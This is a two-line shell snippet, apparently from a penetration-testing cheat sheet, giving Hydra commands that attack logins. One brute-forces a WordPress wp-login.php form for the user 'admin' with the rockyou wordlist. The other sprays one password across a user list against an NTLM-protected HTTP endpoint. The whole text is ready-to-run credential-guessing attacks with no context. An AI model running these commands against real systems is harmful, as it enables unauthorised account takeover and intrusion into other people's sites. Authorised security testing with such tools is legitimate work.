```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Login:wrongPASS' -f -V

hydra -L USERLIST -p password IPADDRESS http-get '/:A=NTLM:F=401'
```